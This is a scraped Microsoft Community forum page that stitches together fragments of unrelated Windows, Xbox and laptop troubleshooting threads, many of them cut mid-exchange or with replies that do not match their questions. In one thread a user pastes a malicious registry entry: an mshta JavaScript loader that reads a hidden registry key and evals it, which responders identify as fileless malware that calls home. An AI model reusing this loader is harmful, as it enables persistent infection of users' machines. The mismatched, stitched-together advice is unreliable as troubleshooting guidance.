<p>Have you tried adding/removing payment methods on the console? What, if any, error message/code do you get here? Also, you cannot remove a payment method if it is tied to a current LIVE Gold subscription. You'd need to either wait for it to finish or replace
 it with another payment method (remember to call phone support to cancel auto renewal if want to wait it out).

<h2>            Logon error - invalid root in registry key</h2>
                    <p>Every time I login to my Windows 7 HP Probook I get the following error;</p>
<p><a href="https://filestore.community.support.microsoft.com/api/images/922a28be-0f96-4060-9637-0ce8a81c77fa" target="_blank" rel="noreferrer nofollow"><img src="https://filestore.community.support.microsoft.com/api/images/922a28be-0f96-4060-9637-0ce8a81c77fa" /></a></p>
<p>&nbsp;</p>
<p>I found the following registry entry: </p>
<p><strong>HKEY_CURRENT_USER/Software/Classes/JJgj9zC/shell/open/command</strong></p>
<p><strong><span>Data:</span></strong><span> mshta "javascript:tnUyEgGI0="4ea";WY7=new ActiveXObject("WScript.Shell");zqK5PYJ2v="MR3m";aDbg8=WY7.RegRead("HKCU\\software\\4445377696\\bf373bf5");fRuZ3DKK="wzj36";eval(aDbg8);jgEd2avkq7="qy";"</span></p>
<p>This is the only registry entry that contains
<span>4445377696\\bf373bf5.</span></p>
<span>4445377696\\bf373bf5.</span></p>
<p>It dose not cause any problems with my laptop or any of my programs. I just close error message and continue without any problems.</p>
<p>Does anybody know what is causing this error message?</p>

</p><p><span>This issue might have caused due to virus, so I suggest you to follow the below methods and check if it helps.</span></p>
<p>
</p><p><strong><span>Method 1: </span></strong>I recommend you to download the Microsoft Safety Scanner from the following link and check if it helps.</p>

<p>
</p><p><strong>Note</strong>: The Microsoft Safety Scanner is a free downloadable security tool that provides on-demand scanning and helps remove viruses, spyware, and other malicious software. It works with your existing antivirus software.</p>
<p>
</p><p><strong><span>Method 2: </span></strong><span>Also I suggest you to end the startup items for the invalid registry as below and check if it helps.</span></p>
<p>
</p><ol>
<li><span>Press Windows+R it will launch run command.</span></li><li><span>Type as MSCONFIG and hit enter.</span></li><li><span>Go to Startup and click on Open task manager.</span></li><li><span>Locate the software, right click on it and disable it.</span></li></ol>

            <p>The Registry key you found is telling Windows to run the key that you did not find.&nbsp; This is typical of Registry malware - they deliberately use a non-standard character at the start of their Registry key&nbsp;with the result&nbsp;that RegEdit is incapable of seeing
 the key.</p>
<p>
</p><p>The key that you did not find is the heart of the matter.&nbsp; It will run within legitimate processes and will call home to receive new instruction including downloading other malware behind your back.</p>
<p>
</p><p>The fact that an error is being generated makes me think that your antimalware application might already have found and deleted the key that you did not find.&nbsp; However, it should also have deleted the key that you did find.</p>
<p>
</p><p>I have no idea what Antimalware application you use or what the MS Denver store used.&nbsp; I found out only a few months ago that MSSE fails to block or subsequently find such malware even though everything else seems to be able to do so.&nbsp;
</p>
<p>
</p><p><a href="https://www.malwarebytes.org/" target="_blank" rel="noreferrer nofollow">Malwarebytes</a> free version** can detect and remove Registry malware so install that and run a scan with it.&nbsp; It can live alongside your normal antimalware because it is just used
 for manual scans, it does not provide "real-time" protection [it does not continuously assess internet traffic or running processes for malware-like behaviour].&nbsp;
</p>
<p>
</p><p>** Just make sure that you do not select their offer of including a trial of their Premium [paid-for] product as&nbsp;doing so&nbsp;would disable your normal, installed antimalware application.</p>

            <p>Thanks for the advice but I still get the same error after the scans.</p>
<p>My installed anit-virus is Norton Security Suite which I keep up to date.</p>
<p>I do use Malwarebytes periodically and it found no problems.</p>
<p>
</p><p>Now when I set up another user account, the script error does not appear when the new user account is used.</p>
<p>The problem with a new user account I would have to re-setup everything I have on my other account.</p>
<p>What can I do to <span>determine the root cause of the issue?</span></p>

<h2>            Many built-in Windows apps broken since late April &#47; early May 2016</h2>
                    <p><span>Broken apps appear with empty tiles on the start menu. Trying to re-register them using Add-AppxPackage fails with error
</span>0x80073CF6 because of missing dependency files for other languages or display scalings.</p>
<p>
</p><p>Extensive investigation has already been done by member iquazee in thread <a href="http://answers.microsoft.com/en-us/windows/forum/apps_windows_10-outlook_mail/many-built-in-windows-apps-broken-add-appxpackage/d9db29ac-e931-4e61-82ff-1cad324a9687?tm=1464146516271" title="Initial post">
Many built-in Windows apps broken, Add-AppxPackage fails with error 0x80073CF6 because of missing language-specific manifest files</a>, proving that the problem is a broken deployment mechanism. After receiving the typical boilerplate responses and useless
 suggestions to reinstall or repair/upgrade, none of which will work, Microsoft seems to be ignoring or blacklisting the initial thread now, hence opening a new one so that it ends up in someone's queue and is hopefully picked up again.</p>
<p>
</p><p>Please take this seriously, productivity is extremely impacted for many people by these apps not working. Note that out of the initial set of affected apps, the Mail / Calendar app has since come right again after another update was deployed on or before
 28-May 2016.</p>

<p>
</p><p>We realize the inconvenience you have experienced.</p>
<p>
</p><p>Are you facing this issue in domain network environment?</p>

            <p>Hi Yashwanth</p>
<p>
</p><p>Thanks for your response. My network is not a domain environment, however, others might have experienced the broken Windows apps in domain environments, because the issue is not related to the network environment that an affected computer is in.</p>
<p>
</p><p>Yes, I checked the event logs with Get-AppxLog, and the entries revealed that both registering and unregistering the broken apps fail because of missing dependency files, as explained above. Please familiarise yourself with the initial thread referenced
 above which provides the details and was responded to by your colleague Wungraileng Vashi but has since gone stale, despite many people chiming in and confirming the issue. Please pay particular attention in the thread to iquazee's excellent analysis of the
 issue, and pass it on without further delay to a person or team who can provide proper support.</p>
<p>
</p><p>We need an urgent fix to repair the broken apps, either by a manual workaround that is easy enough for a user to apply and doesn't compromise the system security, or by a redeployment of the broken apps with all required dependency files and XML manifests
 intact. Microsoft is pushing everyone towards using modern and UWP apps and taking away their Win32 predecessors, so you need to make sure these apps&nbsp;work and aren't crippled again and again by dodgy updates.</p>
<p>
</p><p>Please refrain from responding with default responses or suggestions, like uninstall/reinstall, repair upgrade, delete/create user profile etc. because it has already been proven that none of these will fix the issue, as the root cause is a botched update
 of the affected apps that was deployed about a month ago.</p>
<p>
</p><p>Thanks</p>
<p>Olli</p>

            <p>I have been following Olli's thread, and I can validate exactly what he has been testing. I have a Windows 10 workstation that is a member of a Windows 2008 SBS domain, and has only the EN-US language installed. The default video scaling is 150%.
</p>
<p>
</p><p>The update manifests&nbsp;are missing scaling and language specific files to complete updates. It has caused most default Windows Apps, like Store, News, and (at one point) Mail. It is critical that a fix be published to the general public to fix this core functionality
 of Windows 10.</p>

            <p>Interesting news, yet again. Today some of my broken apps started showing up in the start menu again, and sure enough, my Surface Pro 3 received a whole raft of new app files today (Sat 4-Jun) between 8am and 11am New Zealand time. Updated app files include</p>

<p>
</p><p>As you can see some of the updated apps include language-specific files, like the Mail app, while others include display-scaling-specific files for 100% and 150% - exactly these files were missing earlier in the dodgy updates from late April / early May.</p>
<p>
</p><p>Either the forum people who have gone dark on us passed this on and the responsible team or unit is now fixing the apps, or someone else noticed it, too,&nbsp;and maybe paid for a support call that got through to the right people. Your guess is as good as mine,
 since nobody's talking to us.</p>
<p>
</p><p>There are still some apps that are broken, like Calculator, Alarms &amp; Clock, PDF Reader, Scan, and last but not least, the Store app. Getting somewhere, but still not back to normal.</p>
<p>
</p><p>Wonder if any of you are seeing similar results?</p>

            <p>There ae new app files are indeed there from the time Olli specified, but they have not regenerated new app tiles&nbsp;on my PC or restored functionality to affected apps. This does not appear to be fixing anything&nbsp; a) on my user profile on the workstation. This
 is a profile that I recreated, and when created did not deploy any of the tiles for the affected applications. They are still missing. b) on my wife's profile on the same computer that has been untouched throughout this ordeal. All apps affected are still
 crashing, including the ones with the new manifest.</p>

Description:<br />
Installation Successful: Windows successfully installed the following update: Windows Maps</p>
<p>
</p><p>for the Maps app and others that started working. Looks like some process running with SYSTEM privileges, probably TrustedInstaller or some other Windows Update process, downloaded and registered these apps.</p>
<p>
</p><p>Sad to hear it didn't work the same way for you, which makes this mess even more confusing. Also, when I log on with one of the other user&nbsp;accounts on my Surface Pro 3, apps that are still broken for me, like People, work fine for that other user, probably
 until the point where I change the display settings or language, so there is a user-dependent element to this whole chaos as well.</p>
<p>
</p><p>Ordeal is the right word. It's unbelievable that these apps just crash, without any error information provided to the user, or any resiliency in the deployment process to either roll back to the last known good version or treating missing dependency files
 as non-critical. This is a slap in the face of any user trying to adopt these "crapplications" instead of sticking with Win32 applications, and the complex set of files that have to be in perfect shape and order to make these apps work brings back bad memories
 of DLL ****.</p>
<p>
</p><p>Let us know how it goes.</p>
<p>
</p><p>Best of luck</p>

            <p>They did try to install&nbsp;(Microsoft Phone, Groove Music, Microsoft Solitaire Collection, MSN Money, MSN News, MSN Weather) after downloading updates&nbsp;and not one succeeded last night. All had the ubiquitous 0x80073CF6 error. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</p>
<p>
</p><p>I am really confused. These apps and especially the Store app are the new face of Microsoft's revenue stream in the desktop space. Why do I feel that they are poo pooing it as if its some minor inconvenience? If I were a software developer that leverages
 the Windows Store as a marketplace for their goods, I would have some serious questions as to its reliability, and have serious reconsiderations as to its viability as a storefront.</p>

            <p>Sorry to hear the updated apps are still not working on your system, was hoping they would come right as well - but there seems to be no pattern in this mess.</p>
<p>
</p><p>Totally agree with your statement re the Store app. I can only imagine that there is a serious breakdown in comms between customer feedback, like ours here, and the developers. I have seen it numerous times with various companies over the past few years
 - it's all about featuritis and pushing stuff out that someone thinks is cool, with little testing and QA that it's actually quality code that will perform well. And the people looking after this "answer" forum here are probably trained to fob us off with
 the typical boilerplate responses and not able or allowed to pick up if someone reports a serious issue and forward it on. Maybe you need to raise a paid support call to be taken seriously.</p>
<p>

            Just did a search in the Windows Feedback app (which is still working and hasn't been broken so far) for the error code 0x80073CF6, and got a few results reporting issues that are all along the same lines as ours. Have upvoted them, just in case someone
 is actually looking at these. From my experience almost nothing I ever reported or upvoted in this feedback app has been fixed yet, so I won't get my hopes up.

<h2>            My Windows Store App keeps crashing</h2>
                    <p>Hi</p>
<p>
</p><p>Everytime I try to click on an app I want to download, my windows store crashes. It started happening on the last update and all my other apps are working just fine. The program opens to the entrance screen and it even searches it's when I want to click
 on an app that crashes so I can't download or update apps. What can I do? I've tried all the other suggestions I've seen but nothing works.</p>

            This sounds ridiculous, but i just found out that you have to turn off auto set time on your pc, open the store, let it crash, then go back and turn auto set time back on...

            I actually did that on the advice of a computer tech. DON'T DO IT! It can make your system crash or create problems with the workings of the other apps. I was forced to reset the whole computer and reinstall Windows 10.&nbsp;

<h3> matthewmcr  say:</h3>
<h2>            Send&#47;Receive Text Messages using Cortana with Android phone</h2>
                    <p>When I first got my laptop about a year and a half ago I was thrilled with the fact&nbsp; that I could use Cortana to send and receive text messages. Along with that I could have it ring my phone if it was lost and it would notify me of missed calls (and maybe
 incoming calls.) In any case, the most important part was that I could be using my computer and didn't have to go back and for to text message with someone; It just showed up on my computer. Both my phone and my laptop have since gone through many updates
 but I don't remember any specific one being when the problem started.</p>
<p>
</p><p>*I have a Lenovo Thinkpad (according to the about section on my computer it is a Thinkpad Yoga 14 Signature Edition, Device type: DESKTOP-AKUG7BH</p>
<p>*I have Windows 10 which came with the computer originally</p>
<p>*I have a Samsung Galaxy 7 Edge (Android)</p>
<p>*I have the Windows app for my laptop called "Phone Companion"</p>
<p>*I have the Cortana app for my phone.</p>
<p>*I have both apps synced/paired, etc.</p>
<p>*I have tried looking in different forums and have not found anything that has helped.</p>
<p>*I called Lenovo Support and they had me contact Microsoft.</p>
<p>*I did a chat conversation with Microsoft and they told me they no longer have this feature which is weird considering I can still type in the text message on my laptop and even select who to send it to and then send it and it tells me it is sending but
 then it never reaches the contact. I also ask Cortana to ring my phone and she says something like "attempting to ring phone" which is the same as before but now it doesn't ring. So I am not sure that it is a feature they don't have, I just think mine is not
 making the connection. Even after the Microsoft support person told me this she still told me to try to pair the devices (which I have done.)</p>
<p>
</p><p>So, with all that information can anyone think of any reason it is not working and what I could possibly do to fix this?&nbsp;</p>

            Here is more information.&nbsp; I am using Windows 7 64 bit.&nbsp; I was unable to install two HP programs - HP support assistant and the software for my HP G4050 scanner.&nbsp; I found a Microsoft link: "Fix problems that block programs from being installed or removed."&nbsp;
 I used it and it found that the HP Support Assistant problem was that the version on my computer could not be uninstalled due to a corrupted file.&nbsp; The Microsoft program identified the corrupted file, deleted it and that allowed me to install the Support Assistant.&nbsp;
 For the Scanner software, it did not find a corrupted file, but the Microsoft link had a list of programs that I might be having problems installing.&nbsp; The one I have the problem with is not on the list.&nbsp; Is there a way to get it on the list or any other way
 to find if there is also a corrupted file preventing installation.&nbsp; I did run the System File Check and it found nothing wrong.

            <p>Hi,</p>
<p>
</p><p>
</p><p>It seems that the Windows operating system of your computer is corrupted. Make sure that all critical updates for Windows are successfully installed. We also suggest that you run a repair using the Windows
<strong>Deployment Imaging Servicing and Management (DISM) Tool</strong>. Be sure to back up all important files to avoid losing them in case of failure. Below are the DISM commands that you need to run through an
<strong>elevated command prompt (admin)</strong>.</p>
<p>
</p><p><em><span>DISM&nbsp;/Online /Cleanup-Image /ScanHealth</span></em></p>
<p><em><span>DISM&nbsp;/Online /Cleanup-Image /RestoreHealth</span></em></p>

<p>I appreciate the answer, but to be honest, I am afraid to try this for fear of messing up everything else on my computer which, at present, is working as it should.&nbsp; I decided to send your reply to a local computer repair person to see if he would be willing
 to try this on my computer so that if something goes wrong, he could correct it.&nbsp; I've had this person deal with my computers in the past and am waiting to hear back from him.</p>

            Still not able to install the program for my scanner.&nbsp; I've about given up that, for some reason, this is an unfixable problem.&nbsp; I only wish that when I used the Microsoft link: "Fix problems that block programs from being installed or removed."&nbsp;the Scanner
 software would show up on the&nbsp;list of programs that I might be having problems installing.&nbsp; The one I have the problem with is not on the list.&nbsp;&nbsp; Apparently there is no way to do this.

<h2>            Star Wars Battlefront 2 won&#39;t launch - purchase cancelled&#63;</h2>
                    <p>Hey there!</p>
<p>
</p><p>I've been playing Star Wars Battlefront 2 almost since it's launch about a year ago, but paused for some time now.</p>
<p>
</p><p>When I tried to launch the game a few days ago I found that something must have happened to my license:</p>
<p>
</p><ul>
<li>I get an error 0x803f8007 ("To play this you will need to buy it...")</li><li>My purchase (happened via code redemption) in the purchase history of my account suddenly shows the status "cancelled".</li></ul>
<p>
</p><p>Can somebody please tell me what happened here and how I can get my game back?&nbsp;Any hint is appreciated.<br />
</p>
<p>Thanks in advance, and best regards,</p>
<p>Joerg</p>

<p>Hi Joerg,</p>
<p>
</p><p>Thanks for bringing this to our attention. I'm sorry to hear this is currently happening. I would like to clarify a few things, do you have any other alternative account you use on the Xbox where the game could of possibly been added to instead? If you have
 other accounts I suggest to go over the <a href="https://account.microsoft.com/billing/orders" target="_blank" rel="noreferrer nofollow">
Order History</a> as well as you can check the Owned Game List on the account. </p>
<p>
</p><p>Also, by any chance do you still have the redemption code used to obtain the game? If so I would suggest to get ahold of Live Support as they the tools to review the account to resolve this issue.&nbsp;</p>
<p>
</p><p>The <span><span>best way to reach Live Support would be here:

    <title>Dynamic Frequency appears responsible in Toshiba laptop for - Microsoft Community</title>
<h3> al_capp  say:</h3>
<h2>            Dynamic Frequency appears responsible in Toshiba laptop for involuntary unannounce machine shut down.</h2>
                    <p>Well, I am back.</p>
<p>Shortly after observing the win10 free upgrade icon &nbsp;on my task bar, &nbsp;there appeared a ghost in my machine. and it began simply shutting down unexpectedly. It would allow me to press the power button,, it would start but with long delays in the boot process.</p>
<p>Once logged on the drive / cooling fans would fire up, and within just a minute or 2 it shut itself off. This continued every time in exactly the same way until I was able to very quickly get to settings after logon and reboot to safe mode. Investigating,
 the event system simply stated &nbsp;these were unexpected shutdowns &nbsp;I was initially unable to locate any reference to a process that immediately preceded the unexpected shutdown and the event of the shutdowns included no data as apparently the OS did not see
 it coming either.</p>
<p>Then I began looking for &nbsp;system changes immediately before it began having these fits to no avail. Drivers, registry errors, and maintenance I have setup to run automatically in the background during idle periods, and files scanned upon exposure to the
 system for malware/ viruses.</p>
<p>Tried the recovery process to a date directly pre-problem, &nbsp;and that began an ordeal that lasted days as I attempted to minimize data loss.</p>
<p>That entire process and recovery from it as well as the initial difficulty would require a short novel to relate, but to condense into something more reasonable;</p>
<p>I booted from the original Windows 8 pro cd. tried to repair the installation which by the time it folded on me was 8.1 pro. but was just trying to get a non safe mode unrestricted OS up to back up files I was worried might be lost. This I did after finding
 the images of 8.1 I thought had been created correctly &nbsp;could not be restored.</p>
<p>In the end &nbsp;after being satisfied I had everything I needed on an external drive, I did a fresh install of 8.0 pro, did all the updates, did the re-upgrade to 8.1 figuring win10 would solve the problem. Once it was up and running, it again began with the
 unannounced &nbsp; shutdowns, I went to BIOs, to detune the system since the fans were ablazing &nbsp;again, cpu usage was way up again right before it would shut down.</p>
<p>In the end, I am patiently awaiting Win 10, and have solve the shutdowns by disabling dynamic frequecy, and selecting the slower speed as the norm. &nbsp;The system is no longer shutting itself off, the cpu usage is back to norm (very low), and the fans have
 quit their habit of powering up to very high speeds before &nbsp;shutting off the hardware..&nbsp;</p>
<p>In the interim, I picked up a diagnostic to check temp sensors in the machine, have learned nothing really new other then the situation was corrected by switching off Dynamic Frequecy.&nbsp;</p>
<p>My theory &nbsp;thus far is there may be a relatively new struggle going on for control of the sensors, &nbsp;cooling fans involving &nbsp;AHCI between &nbsp;hardware and software, but if you have some insights, I am all ears.</p>
<p>I certainly hope Win10pro gives me the opportunity to burn an install DVD for future difficulties as trying to restore off of an external drive &nbsp;just created another headache in the recovery &nbsp;process called WIN 2 GO. And before you state it, I was able to
 find the group policy settings as well as the registry entries that had to be edited to install my way back to a functional system. It &nbsp;was most educational, but really, I am just getting too old for this ****. Its not a good sign to be day-dreaming of the
 good old days of 8088's.</p>
<p>Best Regards</p>

            <p>Hello,</p>
<p>
</p><p>Thank you for posting your question on Microsoft community.</p>
<p>
</p><p>I would like to know some information about the issue so that we could help you better.</p>
<p>
</p><p>What is the complete model number of your toshiba laptop?</p>
<p>
</p><p>I appreciate you for providing details about the issue and your efforts towards resolving it.</p>
<p>
</p><p>This issue may occur either due to software conflicts or if drivers are corrupt.</p>
<p>
</p><p>I would suggest you to try following methods and check if it helps.</p>
<p>
</p><p><strong>Method 1:</strong><br />
<strong>Perform clean boot</strong> and check.<br />

<strong>How to perform a clean boot in Windows</strong><br />
<a href="https://support.microsoft.com/en-us/kb/929135" target="_blank" rel="noreferrer nofollow">https://support.microsoft.com/en-us/kb/929135</a></p>
<p>
</p><p>Clean boot is performed to start Windows by using a minimal set of drivers and startup programs. This helps eliminate software conflicts that occur when you install a program or an update or when you run a program.</p>
<p>
</p><p>Note: After you have finished troubleshooting, follow these steps from section ‚ÄúHow to reset the computer to start as usual after clean boot troubleshooting‚Äù to reset the computer to start as usual.</p>
<p>
</p><p>If it does not help, use method 2.</p>
<p>
</p><p><strong>Method 2:</strong><br />
Please <strong>update all the motherboard drivers from the computer manufacturer's website
</strong>and check the issue.<br />
Refer:<br />
<strong>Download and install drivers</strong><br />

            <p>Thanks for the interest. During my previous go around with this Toshiba&nbsp; I did a step by step analysis of drivers including ASC's driver&nbsp;tracking software. All to no avail.. After realizing a system restore was not going to be quick and painless,&nbsp;and having
 reserved the win10 upgrade, I simply&nbsp;resigned myself to a 800 mhz.</p>
<p>The upgrade to win 10 was another easy process but did not correct the dynamic cpu frequency problem and the unexpected shut downs. Until yesterday.</p>
<p>While repairing an old stereo receiver, the answer came.</p>
<p>I live 'off the grid' in the middle of the Utah high desert, and looking at the home stereo's motherboard once the case was removed, all I saw was a desert landscape and the epiphany occurred.
</p>
<p>I live in a place called IRON county. What do you suppose is the main ingredient is in desert dust.&nbsp; In this neck of the woods, its conductive iron ore.
</p>
<p>I have regularly used compressed air in a can to minimize dust buildup, but apparently that was not adequate.&nbsp; I fired up the compressor, and proceeded to provide this laptop with air currents and pressures not found in a can.. The higher pressure and flow
 of air from the compressor directed into every conceivable opening resulted in the removal of most if not all of this iron rich dust. The trade off was the number of keys that were liberated from the laptop art the same time, and of course included the F2
 key to get to cmos&nbsp; when I rebooted. I switched the dynamic frequency back on, cpu speed went from 800 to 2310, and it has not turned itself off even once.</p>
<p>In other words, it was a perfect storm. Dust with a high iron content built up inside the laptop, and the idiot (me)&nbsp; who simply believed it was not possible for such a thing to occur.</p>
<p>The system is running excellent again. Now finding those missing keys, that's another complete story.</p>
<p>Best Regards</p>

<p>Hi clhardingjr,</p>
<p>If you want to have a slideshow with pictures (wallpapers) from multiple themes, you need to create or edit a theme to manually add the desired pictures, as explained by Jeeped above. It's not possible to select two themes at the same time, nor to tell Windows
 to automatically chain from one theme's slideshow to another theme's slideshow.</p>

            <p>I'm on a Mac, but running Windows 8.1 through Parallels. Never had this problem until I upgraded to 8.1. There is no error message - the issue is that the Microsoft App Store just randomly opens about 10 times a day. Doesn't matter what I'm doing - does
 it when I'm on the Mac side and does it while I'm on the Windows side.</p>

<h2>            HATE Windows 10, can&#39;t go back ... HELP &#33;</h2>
                    <p>After trying Windows 10 for a bit of time, I learned that I could no longer use my Office, Word Pad, or Note Pad to print documents from.</p>
<p>
</p><p>I also found importing pictures from my cell phone nearly impossible compared with the previous Windows version I had, 8.1</p>
<p>
</p><p>I read the tutorials about going back to my old version of Windows, but it looks like after a period of time the OLD file is gone and I'm locked in.</p>
<p>
</p><p>What I found out was that Windows 10 removes any previous versions if the user doesn't revert to the OLD version within a certain time frame.</p>
<p>
</p><p>I have uninstalled and reinstalled my printer program with drivers and updates, I did that with my laptop, and I made sure I had all of the Windows updates as instructed, still can't print using Office, word pad, note pad or Google Chrome.</p>

            After you install Windows 10 you only have the option to go back to your previous version of Windows for one month as the Windows.old folder automatically gets deleted. If you have a Windows 8.1 disc or a recovery partition on your computer you should
 be able to get back to 8.1 that way.

            <p>Thanks for replying, Patrick.&nbsp; I have an HP Laptop, a <strong>HP dv-7471 us entertainment notebook.&nbsp; It is a little over 2 years old and is running Windows 7.1&nbsp; The touchpad&nbsp; is a Synaptic.</strong></p>
<p>&nbsp;</p>
<p>I was unable to download any drivers from synaptics, Microsoft, or HP.&nbsp; Whenever I tried to download from HP, I was asked to download and run programs for HP to determine my system, hardware, and programs.&nbsp; I selected the run option when I clicked on the
 download button for the HP programs&nbsp; The programs seemed to download but not install or function.&nbsp; Therefore, I was not able to download drivers from HP, or do anything else.</p>
<p>&nbsp;</p>
<p>I went to Microsoft and attempted to run several Fix It programs.&nbsp; Each time, while the programs were trying to install, they stopped saying they could not continue as there was a MATSwizard_amd64&nbsp; error.&nbsp; I don't know what that is or how to fix it.</p>
<p>&nbsp;</p>
<p>I did download and run a Microsoft Diagnostic Tool program.&nbsp; It ran but nothing that I could tell was fixed or changed.&nbsp; I also tried a couple of System Restoress, but for each one the restore was not able to make changes and the restores failed.</p>
<p>&nbsp;</p>
<p>In total frustration, I wnt to Control Panel - Mouse and removed the generic USB mouse driver.&nbsp; Then, I rebooted.&nbsp; With no mouse driver present the reboot installed the Synaptics Touchpad driver.&nbsp; Although it is working and I checked all the settings, the
 mouse pointer just freezes for some unknown reason.&nbsp; The only thing I can do is power down and reboot.</p>
<p>&nbsp;</p>
<p>Please excuse my lengthy response.&nbsp; I wanted to provide as much information as I thought you may need to help me resolve the mouse now freezing problem.</p>
<p>&nbsp;</p>
<p>I would appreciate any suggestions you may have.&nbsp; And thanks for putting up with my lengthy diatribe.</p>
<p>&nbsp;</p>

            Sharon, let's run the System File Checker:<br />
<br />
<u><b>SFC /SCANNOW:</b></u><br />
<br />
<b>What does running SFC /SCANNOW do?</b><br />
<br />
The sfc /scannow command (System File Checker) scans the integrity of all protected Windows 7 system files and replaces incorrect corrupted, changed/modified, or damaged versions with the correct versions if possible.<br />
<br />
<b>To run the SFC /SCANNOW command in Windows 7:</b><br />
<br />
- Open an elevated command promt (run cmd as administrator).<br />
<br />
- In elevated command prompt, type "sfc /scannow" without the quotes, and press enter. Do note this can take some time to finish.<br />
<br />
<b>To see and read only the "SFC" scan results from the CBS.log:</b><br />
<br />
- Open an elevated command promt (run cmd as administrator).<br />
<br />
- Copy and paste the following and then press enter:<br />
<br />
findstr /c:"[SR]" %windir%\Logs\CBS\CBS.log &gt;C:\sfcdetails.txt<br />
This will create a file called sfcdetails.txt at the root of your system (C:\) containing only the SFC scan results from the CBS.log.<br />
<br />
Once you have the log generated, upload it to Skydrive or a site of your choosing and attach the link here in your next post.<br />
<br />
Regards,<br />
<br />
Patrick<br />

            <p>Hi Patrick,</p>
<p>&nbsp;</p>
<p>I ran sfc and looked at the large CBS.log.&nbsp; I didn't understand it, but in scrolling down, I saw a lot of "failed"s and a lot of repairs.&nbsp; Unfortunately, to open the file I had to change all the permissions.</p>
<p>&nbsp;</p>
<p>t has been a log time since I have worked in the DOS command box and althhough I copied your "findstr" command, I forgot how to paste it.&nbsp; So, I typed it in (several times because of typos).&nbsp; I guess I was tryting to show myself that I remembered a little
 bit of DOS and pasted the command in the box and ran it a second time.&nbsp; I got a message that it couln't open CBS.log and ran it again.&nbsp; By the time I realized I should find the output file, I had ran the command a couple of times and the output file was zero
 bytes.&nbsp; So I went to the location of the original CBS.log file and saw that it had been deleted.</p>
<p>&nbsp;</p>
<p>I am so sorry.&nbsp; I know that you needed to see what had happened when I ran sfc and I apologize for messing it up.</p>
<p>&nbsp;</p>
<p>I did try to run some of the Fix It programs and most now worked (rather they downloaded and ran).&nbsp; They did fix many errors but one of the programs still could not run.&nbsp; It was the Fix It program the fixes problems with Windows Updates&nbsp; (
<a href="http://support.microsoft.com/mats/windows_update/" target="_blank" rel="noreferrer nofollow">http://support.microsoft.com/mats/windows_update/</a>&nbsp;).&nbsp; It could not verify the MATSWizard_amd64..)&nbsp; So although the sfc fixed a lot of things, it did not fix the MATSWizard_amd64.. file.&nbsp; I will
 run the Diagnostic Tool again after I finish this note to you, since it takes a while to run.</p>
<p>&nbsp;</p>
<p>So, I still have the MATS.. problem, and the pointer continues to unpredictably freeze.</p>
<p>&nbsp;</p>
<p>Patrick, again, I'm sorry about messing up the .txt file you needed.&nbsp; And I want you to know that I really appreciate your time, interest, and effort in helping me.</p>
<p>&nbsp;</p>
<p>Is there anything else that we can do?</p>
<p>&nbsp;</p>
<p>Thanks,</p>
<p>Sharon</p>

            <p>Hi Patrick,</p>
<p>&nbsp;</p>
<p>FYI a quick update.&nbsp; I ran the MS Fix It programs and still was not able to run the same one I tried with the MATSWizard_amd64.cab problem.</p>
<p>&nbsp;</p>
<p>After much work on the HP site, I was still not able to install their hardware and software dection programs.&nbsp; No&nbsp; specific error message.&nbsp; I was able to discover&nbsp;how to reinstall the Synaptics Touchpad Driver from where HP stored original hardware drivers
 on my computer.&nbsp; Seems to be working well but will need a little more time to see if that cured the pointer freezing problem.</p>
<p>&nbsp;</p>
<p>Also, I saw an opportunity to restore some system files, which I ran.&nbsp; It did not fix the MATS situation.</p>
<p>&nbsp;</p>
<p>Now. of we could find a way to&nbsp;restore the MATSWizard_amd64.cab file.</p>
<p>&nbsp;</p>
<p>Thanks for liistening.</p>
<p>Sharon</p>

            Sharon, it's my pleasure and you've done great work.<br />
<br />
At this point, the best option is to either try a repair install or a clean install of Windows.<br />
<br />

Repair if you'd like to keep all of your files, clean if you at this time don't care and just want a brand new, fresh, working Windows installation that is GUARANTEED to work.<br />

            <p>Hi again, Patrick,</p>
<p>&nbsp;</p>
<p>I was going to try a repair install but I can not download Win 7 with SP 1.&nbsp; My computer says that&nbsp; the file is not safe, and does not give me the option to download it anyway.&nbsp; Neither can I download anything else from that site. &nbsp;I tried a couple of more
 times but I received an unreadable&nbsp;document with characters and symbols.&nbsp; Any thoughts?</p>
<p>&nbsp;</p>
<p>And, to follow up with the Synaptics issue, since I re-installed the driver I have had no freezes or crazy behavior.</p>

<br />
If the issues have disappeared since reinstalling the touchpad driver, you're in the clear. However, if you still have the issues that you mentioned above, did your HP laptop come with a recovery partition? If so, you should be able to reset factory defaults
 and restore the laptop to how you first got it when purchased. If not, did it come with any installation media (installation DVD, etc)?<br />
<br />

<p>Just a quick note.&nbsp; The problems with the touch pad have been resolved.&nbsp; But the problem with MATSWizard_amd64cab are very present.</p>
<p>&nbsp;</p>
<p>I went back to the site you suggested and, duh, instead of running the Win 7 program, I am downloading it.&nbsp; It is downloading now and hopefully, I will be able to do the restore you talked about.&nbsp; Will keep you posted.</p>

            Hi Keith, if you are getting this error on a blue screen when your system tries to boot:
<br />
<br />Start your PC, just as Windows attempts to load (spinning dots), press and hold Power Button for 5 - 10 seconds to perform a Hard Shut Down 
<br />
<br />Do this twice 
<br />
<br />On the third start Windows will boot into the Recovery Environment and from there you can access System Repair, Safe Mode, Command Prompt . . . etc. 
<br />
<br />Please try each option one at a time, then see of Windows will boot . . . 
<br />
<br />Go to Troubleshoot - Advanced Option - Command Prompt
<br />
<br />Run this command and hit Enter:
<br />
<br />chkdsk C: /f /r
<br />
<br />That command will take time to complete
<br />
<br />When it does complete, try booting back into Windows 10

<strong>UNPLUGGED</strong> during such a storm, as were all other items above, but I got "lazy" and forgot about it (as it was in another room).
</p>
<p>
</p><p>At the repair shop the head technician told me that the hard disk itself was fine, but that the BOX's USB connector and chip had been "fried" and that I needed a new BOX. It was ready a few days later, but when I tried it out on my WinXP and Win-VISTA laptops,
 neither would recognize the USB-4 box. I took it back to the shop where the technician, who stated that he had tested it out on several laptops and it had worked fine. He repeated these procedures in my presence and, sure enough, USB-3 was recognized, as the
 files on the hard disk visible. He repeated this process on laptops running WinXp (SP-3), Windows-VISTA, Windows 7, and so on. They sent the new box, along with my 2 laptops (I had not used the Windows-VISTA laptop for months) to their central office for diagnostics,
 but NO ONE could figure out the problem.)</p>
<p>
</p><p>My questions are:</p>
<p>1.) Does anyone have any idea <strong>WHY</strong> the USB-3 box (with its internal chip) is NOT being recognized by these 2 laptops (which have the latest BIOS re-installed) and are kept up-to-date regarding updates, etc., especially when laptops at the
 repair shop with the same BIOS and versions of Windows recognized the USB-3 and revealed the contents of the hard disk inside?</p>
